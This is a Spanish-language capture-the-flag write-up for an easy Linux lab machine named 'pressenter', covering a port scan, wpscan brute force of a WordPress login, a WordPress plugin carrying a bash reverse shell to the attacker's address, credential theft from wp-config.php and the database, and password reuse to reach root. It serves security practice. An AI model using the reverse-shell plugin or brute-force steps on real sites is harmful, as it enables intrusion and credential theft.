---
Maquina: pressenter
SO: Linux
Explotación: Análisis web y fuerza bruta
Escala_privs: Permisos sudo
Dificultad: Fácil
tags:
  - maquina
  - web_discovery
  - linux
  - escala_privs
  - ssh
  - web
  - fuerza_bruta
---
## Reconocimiento

1. **Explorar los puerto abiertos del docker**: 

```bash 
nmap -p- --open --min-rate 5000 -sVC -Pn 172.17.0.2
```

![[Pasted image 20241111084751.png]]

Por lo que podemos observar hay tan solo un portal web activo así que nos tocará hacer un buen análisis web.

1.- Código fuente -> no se aprecian comentarios notorios.

2.- Análisis de subdirectorios con herramientas como dirb o gobuster -> Se encuentran solo un par de directorios y ambos con permisos muy reducidos.

3.- Análisis profundo de la web principal que observamos.

![[Pasted image 20241111090355.png]]

Si nos fijamos en la parte de abajo vemos que hay un dominio con el que podemos descubrir más sobre los creadores del protal web.

![[Pasted image 20241111091934.png]]

Si hay algo que me llama mucho la atención es el nombre de "perssi". Puede que nos acerquemos al acceso de su wordpress... Vamos a probar a un ataque de fuerza bruta a ver si podemos encontrar sus credenciales.

```bash
wpscan --url http://pressenter.hl/ --usernames pressi --passwords /home/alejandro/wordlists/rockyou.txt
```

![[Pasted image 20241111092048.png]]

Pues resuelta que sí -> pressi y dumbass. Vamos a intentar acceder con estas credenciales.

![[Pasted image 20241111092144.png]]

Estamos dentro! Pues vamos a intentar hacer un clásico de WordPress y crear un plugin que en realidad sea un reverse shell.

```bash
nano revershell.php #Vamos a configurar el archivo de reverse shell
```

```php
#Codigo de reverse shell ->
<?php
/*
Plugin Name: Plugin Malicioso
Description: Plugin para pruebas de seguridad en un entorno controlado.
Version: 1.0
Author: Pepito
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'");
?>

```

```bash
zip -r plugin.zip revershell.php #Lo comprimimos para poder subirlo a wordpress
```

Una vez tenemos el plugin listo nos vamos al portal web de wordpress, añadir plugins -> subir plugin -> subimos el plugin e instalamos ahora y la mágia aparece cuando activamos el plugin.

![[Pasted image 20241111093412.png]]

Estamos dentro ;)

Ahora vamos a hacer el proceso de upgrade de tty de siempre y vamos a ver los premisos que tenemos.

![[Pasted image 20241111093622.png]]

Ya tenemos una tty funcional, pero me temo que no tenemos ningún tipo de passwd... Vamos a ver que nos encontramos de interés..

Para intentar ver el usuario de la base de datos desde el www-data podemos intentar acceder al wp-config.php ->

![[Pasted image 20241111095741.png]]

Parece que tenemos algo interesante (admin, rooteable), vamos a ver si podemos acceder a la base de datos.

![[Pasted image 20241111095927.png]]

Parece que estamos dentro de la base de datos, vamos a ver si tienen algo interesante...

![[Pasted image 20241111100115.png]]

```mysql
#Recopilación de comandos usados:
show databases;

use wordpress;

show tables;

select * from wp_usernames;
```

Pero bueno, que tenemos aquí, parece que tenemos el nombre de usuario y la passwd de un posible usuario del sistema... (Enter y kernellinuxhack)

![[Pasted image 20241111100156.png]]

Sorpresa... Estamos dentro del usuario Enter, ahora vamos a ver si tiene permisos ->

![[Pasted image 20241111100702.png]]

Por lo que vemos tenemos unos pocos permisos para poder leer cualquier tipo de documento y curiosamente tenemos un documento un poco peculiar en nuestro directorio con el siguiente contenido -> 4a05a7bc45edb56b1f033ca1606e176c.

![[Pasted image 20241111100829.png]]

Pero por desgracia solo se trata de un elemento que nos hace perder el tiempo. El verdado misterio se revela cuando probamos la contraseña de enter en root ->

![[Pasted image 20241111101330.png]]




